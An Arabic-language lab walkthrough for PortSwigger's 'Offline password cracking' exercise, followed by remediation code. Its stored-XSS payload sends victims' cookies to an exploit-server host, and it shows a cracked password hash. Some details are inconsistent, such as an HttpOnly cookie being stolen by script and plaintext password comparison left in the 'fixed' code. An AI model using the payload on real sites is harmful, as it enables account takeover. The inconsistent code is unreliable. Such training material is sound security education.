# Lab: Offline password cracking

> **Category:** Authentication  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة XSS المخزنة (Stored XSS) لسرقة كوكي `stay-logged-in` الخاصة بـ `carlos`. هذه الكوكي تحتوي على `username:MD5(password)`. نقوم بفك تشفير MD5 (باستخدام محرك بحث أو كسر كلمة المرور) ثم تسجيل الدخول بحساب `carlos` وحذف حسابه.

**المعطيات:**
- حسابنا: `wiener:peter`
- حساب الضحية: `carlos`

**المطلوب:** الحصول على كلمة مرور `carlos`، تسجيل الدخول، وحذف حسابه.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم بنية كوكي "stay-logged-in"

- سجل الدخول بـ `wiener:peter` مع تفعيل **Stay logged in**
- في Burp، انظر إلى كوكي `stay-logged-in`:

```
stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

- فك التشفير بـ **Base64 decode**:

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

**التركيب:** `username:MD5(password)`

### الخطوة 2: إنشاء XSS payload لسرقة الكوكي

- اذهب إلى أي مقال في المدونة (blog post)
- أضف تعليقاً (comment) يحتوي على XSS payload التالي:

```html
<script>
    document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/' + document.cookie;
</script>
```

**ملاحظة:** استبدل `YOUR-EXPLOIT-SERVER-ID` بمعرف خادم الاستغلال الخاص بك.

### الخطوة 3: نشر التعليق

- أرسل التعليق
- الـ payload سيتم تخزينه (Stored XSS) وتنفيذه عندما يزور الضحية الصفحة

### الخطوة 4: مراقبة سجلات خادم الاستغلال

- في خادم الاستغلال (Exploit server)، افتح **Access log**
- انتظر حتى يزور الضحية الصفحة (قد يستغرق بضع ثوانٍ)
- ستجد طلباً مثل:

```
GET /stay-logged-in=carlos%3A26323c16d5f4dabff3bb136f2460a943
```

### الخطوة 5: استخراج كوكي carlos

- قيمة الكوكي المسروقة (بعد فك الترميز URL):

```
stay-logged-in=carlos:26323c16d5f4dabff3bb136f2460a943
```

- قم بـ **Base64 decode**:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

### الخطوة 6: كسر كلمة المرور (MD5 cracking)

- الجزء الثاني هو MD5 hash: `26323c16d5f4dabff3bb136f2460a943`
- ابحث عن هذا الـ hash في محرك بحث (أو استخدم موقع مثل `md5online.org` أو `crackstation.net`)

**النتيجة:** كلمة المرور هي `onceuponatime`

### الخطوة 7: تسجيل الدخول بحساب carlos

- استخدم:
  - **Username:** `carlos`
  - **Password:** `onceuponatime`

### الخطوة 8: حذف الحساب

- اذهب إلى **My account**
- اضغط على **Delete account**

### الخطوة 9: حل المختبر

بعد حذف الحساب، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي الثغرة المستخدمة؟** | Stored XSS لسرقة الكوكي |
| **ما هي المعلومات المسروقة؟** | كوكي `stay-logged-in` التي تحتوي على `username:MD5(password)` |
| **كيف يتم كسر MD5؟** | باستخدام قواعد بيانات الهاش (مثل CrackStation) |
| **لماذا يسمى Offline password cracking؟** | لأننا نأخذ الهاش ونكسره خارج النظام (offline) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. تخزين هاش كلمة المرور في الكوكي (قابل للسرقة والكسر)
2. وجود ثغرة XSS تسمح بسرقة الكوكي
3. استخدام MD5 (خوارزمية ضعيفة) لتجزئة كلمة المرور

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/login.js - تخزين MD5 في الكوكي
import crypto from 'crypto';

export default function handler(req, res) {
  const { username, password } = req.body;
  const user = getUserByUsername(username);
  
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // خطأ: تخزين هاش MD5 في الكوكي
  const hash = crypto.createHash('md5').update(password).digest('hex');
  const cookieValue = Buffer.from(`${username}:${hash}`).toString('base64');
  res.setHeader('Set-Cookie', `stay-logged-in=${cookieValue}; HttpOnly`);
  
  req.session.userId = user.id;
  res.redirect('/my-account');
}

// pages/blog/comment.js - تخزين التعليقات (XSS)
export default function commentHandler(req, res) {
  const { comment } = req.body;
  
  // خطأ: تخزين التعليق دون تنقية (sanitization)
  saveComment(comment);
  res.redirect('/blog');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/login.js - إصلاح تخزين الكوكي
import crypto from 'crypto';
import { v4 as uuidv4 } from 'uuid';

export default function handler(req, res) {
  const { username, password, stayLoggedIn } = req.body;
  const user = getUserByUsername(username);
  
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  if (stayLoggedIn) {
    // التصحيح 1: استخدام رمز عشوائي غير قابل للتخمين
    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = Date.now() + 30 * 24 * 60 * 60 * 1000;
    
    // التصحيح 2: تخزين الرمز في قاعدة البيانات
    storeStayLoggedInToken(user.id, token, expiresAt);
    
    res.setHeader('Set-Cookie', `stay-logged-in=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=${30*24*60*60}`);
  }
  
  req.session.userId = user.id;
  res.redirect('/my-account');
}
```

```javascript
// pages/blog/comment.js - إصلاح XSS
import DOMPurify from 'dompurify';

export default function commentHandler(req, res) {
  let { comment } = req.body;
  
  // التصحيح 3: تنقية التعليق (sanitization) لمنع XSS
  const sanitizedComment = DOMPurify.sanitize(comment);
  
  saveComment(sanitizedComment);
  res.redirect('/blog');
}
```

```javascript
// middleware/auth.js - التحقق من الكوكي الآمن
export async function authMiddleware(req, res, next) {
  const token = req.cookies['stay-logged-in'];
  
  if (token) {
    // التصحيح 4: التحقق من الرمز في قاعدة البيانات
    const session = await getStayLoggedInSession(token);
    
    if (session && session.expiresAt > Date.now()) {
      req.user = getUserById(session.userId);
    } else {
      res.setHeader('Set-Cookie', 'stay-logged-in=; Max-Age=0');
    }
  }
  
  next();
}
```

**الخلاصة:** 
1. لا تخزن هاش كلمة المرور في الكوكي (حتى لو كانت MD5)
2. استخدم رموز عشوائية طويلة (tokens) مخزنة في قاعدة البيانات
3. قم بتنقية (sanitize) جميع مدخلات المستخدم لمنع XSS
4. استخدم خوارزميات قوية (bcrypt, scrypt) لحماية كلمات المرور

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **لا تخزن هاش كلمة المرور في الكوكي** | استخدم رموز عشوائية (tokens) بدلاً من ذلك |
| **استخدام خوارزميات قوية** | استخدم bcrypt أو scrypt لتخزين كلمات المرور |
| **تنقية المدخلات (Sanitization)** | امنع XSS باستخدام مكتبات مثل DOMPurify |
| **HttpOnly + Secure cookies** | لمنع وصول JavaScript إلى الكوكي |
| **صلاحية زمنية قصيرة** | اجعل رموز stay-logged-in تنتهي بعد فترة |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
- [MD5 Crackers](https://crackstation.net/)
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
